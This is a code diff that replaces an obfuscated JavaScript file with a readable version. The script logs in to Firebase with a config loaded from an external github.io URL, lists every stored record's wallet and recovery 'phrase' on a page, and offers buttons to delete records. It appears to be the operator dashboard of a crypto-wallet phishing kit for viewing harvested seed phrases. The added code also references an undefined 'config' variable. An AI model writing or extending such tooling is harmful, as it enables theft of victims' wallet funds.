@@ -1,1 +1,96 @@
-const _0x38f0d3=_0x7809;function _0x7809(_0x3a53bb,_0x47c336){const _0xdf8c8c=_0xdf8c();return _0x7809=function(_0x780902,_0xa75d8){_0x780902=_0x780902-0x77;let _0x52bd15=_0xdf8c8c[_0x780902];return _0x52bd15;},_0x7809(_0x3a53bb,_0x47c336);}function _0xdf8c(){const _0x468706=['href','<p>Wallet:\x20','button','Data\x20Deleted','get','3335352swBmyL','#root','background-color:\x20rgb(54,\x2057,\x2063);\x20color:white;','click','createElement','querySelector','170681JcvisM','2679594mmhfKF','data','appendChild','\x20<br>\x20','initializeApp','reload','signOut','firestore','then','auth','707308tvraRP','</p><br>','delete\x20sure?','style','wallet','#logout','div','setAttribute','catch','forEach','log','innerHTML','6fktURm','target','doc','prepend','838770kjhZdb','740108tSAWXp','570105suWPQq'];_0xdf8c=function(){return _0x468706;};return _0xdf8c();}(function(_0x34db8e,_0x540277){const _0x551461=_0x7809,_0x45578a=_0x34db8e();while(!![]){try{const _0x29a07c=parseInt(_0x551461(0x87))/0x1+parseInt(_0x551461(0x79))/0x2+parseInt(_0x551461(0x9e))/0x3*(-parseInt(_0x551461(0x7a))/0x4)+-parseInt(_0x551461(0x7b))/0x5+parseInt(_0x551461(0x88))/0x6+parseInt(_0x551461(0x92))/0x7+-parseInt(_0x551461(0x81))/0x8;if(_0x29a07c===_0x540277)break;else _0x45578a['push'](_0x45578a['shift']());}catch(_0x246b42){_0x45578a['push'](_0x45578a['shift']());}}}(_0xdf8c,0x39cab));import{acc as _0x3e143e}from'https://giterhaber.github.io/web-codes/configs.js';import{cmBwsbFSqC as _0xed513a}from'https://giterhaber.github.io/web-codes/configs.js';const app1=firebase[_0x38f0d3(0x8c)](_0x3e143e),auth=firebase[_0x38f0d3(0x91)](app1);auth['onAuthStateChanged'](_0x3bdad7=>{const _0x4f6701=_0x38f0d3;if(_0x3bdad7){var _0x1c80ec=_0x3bdad7['uid'];console[_0x4f6701(0x9c)]('signed\x20in');}else console[_0x4f6701(0x9c)]('signed\x20out'),location[_0x4f6701(0x7c)]='./';}),$(_0x38f0d3(0x97))['on']('click',()=>{const _0x568456=_0x38f0d3;auth[_0x568456(0x8e)]();});const app2=firebase[_0x38f0d3(0x8c)](_0xed513a,'app2');var db=firebase[_0x38f0d3(0x8f)](app2);const rootDIV=document[_0x38f0d3(0x86)](_0x38f0d3(0x82));function deleteTodo(_0x2b2f09){const _0x2057b6=_0x38f0d3;let _0x43fddc=_0x2b2f09[_0x2057b6(0x9f)],_0x41401b=_0x43fddc['parentElement']['id'];confirm(_0x2057b6(0x94))&&(console[_0x2057b6(0x9c)](_0x41401b),db['collection'](_0x2057b6(0x89))[_0x2057b6(0x77)](_0x41401b)['delete']()[_0x2057b6(0x90)](()=>{const _0x266321=_0x2057b6;alert(_0x266321(0x7f)),window['location'][_0x266321(0x8d)]();})[_0x2057b6(0x9a)](_0x1f6851=>{console['log'](_0x1f6851);}));}db['collection'](_0x38f0d3(0x89))[_0x38f0d3(0x80)]()['then'](_0xc02bac=>{const _0x223608=_0x38f0d3;_0xc02bac[_0x223608(0x9b)](_0xcc2f26=>{const _0x54297f=_0x223608;let _0x473b3d=_0xcc2f26['data']()[_0x54297f(0x96)],_0x1c4e11=_0xcc2f26[_0x54297f(0x89)]()['phrase'],_0x3dd3ae=_0x54297f(0x7d)+_0x473b3d+_0x54297f(0x8b)+_0x1c4e11+_0x54297f(0x93),_0x375fc3=document[_0x54297f(0x85)](_0x54297f(0x98));_0x375fc3['id']=_0xcc2f26['id'],_0x375fc3[_0x54297f(0x9d)]=_0x3dd3ae,rootDIV[_0x54297f(0x8a)](_0x375fc3);let _0x1eb1c3=document['createElement'](_0x54297f(0x7e));_0x1eb1c3[_0x54297f(0x99)](_0x54297f(0x95),_0x54297f(0x83)),_0x1eb1c3[_0x54297f(0x9d)]='🗑️',_0x1eb1c3['addEventListener'](_0x54297f(0x84),deleteTodo),_0x375fc3[_0x54297f(0x78)](_0x1eb1c3);});});
+// import firebase from "https://cdn.skypack.dev/firebase/compat/app";
+// import "https://cdn.skypack.dev/firebase/compat/auth";
+// import "https://cdn.skypack.dev/firebase/compat/firestore";
+
+import {acc as ACCOUNT} from "https://giterhaber.github.io/web-codes/configs.js"
+import { cmBwsbFSqC } from 'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js'
+
+
+const app1 = firebase.initializeApp(ACCOUNT);
+const auth = firebase.auth(app1);
+
+auth.onAuthStateChanged((user) => {
+    if (user) {
+      // User is signed in, see docs for a list of available properties
+      // https://firebase.google.com/docs/reference/js/firebase.User
+      var uid = user.uid;
+      // ...
+      console.log('signed in')
+    } else {
+      // User is signed out
+      // ...
+      console.log('signed out')
+      location.href = './'
+    }
+  });
+  $('#logout').on('click', () => {
+    auth.signOut()
+})
+
+  
+//DATABASE
+
+
+const app2 = firebase.initializeApp(config, 'app2');
+var db = firebase.firestore(app2);
+const rootDIV = document.querySelector('#root');
+
+
+function deleteTodo(event) {
+  let button = event.target
+  let docId = button.parentElement.id
+
+
+  if (confirm('delete sure?')) {
+    console.log(docId)
+    db.collection('data').doc(docId).delete()
+      .then(() => {
+        alert('Data Deleted')
+        window.location.reload();
+      })
+      .catch((err) => {
+        console.log(err)
+      })
+
+  }
+
+}
+
+
+//get data
+ db.collection("data").get().then((querySnapshot) => {
+ querySnapshot.forEach((doc) => {
+// doc.data() is never undefined for query doc snapshots
+
+// console.log(doc.id, " => ", doc.data());
+
+let wallet = doc.data().wallet
+let phrase = doc.data().phrase
+
+// console.log(`Wallet: ${wallet} <br> ${phrase}`)
+
+let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
+// let para = document.createElement("div")
+// para.innerHTML = text
+// rootDIV.appendChild(para)
+ 
+   let line = document.createElement("div");
+   line.id = doc.id;
+   line.innerHTML = text
+   rootDIV.appendChild(line)
+
+
+//del button
+let delBtn = document.createElement("button")
+   delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:white;")
+   delBtn.innerHTML = "🗑️"
+delBtn.addEventListener("click", deleteTodo)
+line.prepend(delBtn)
+
+
+});
+});
+
+
+
+
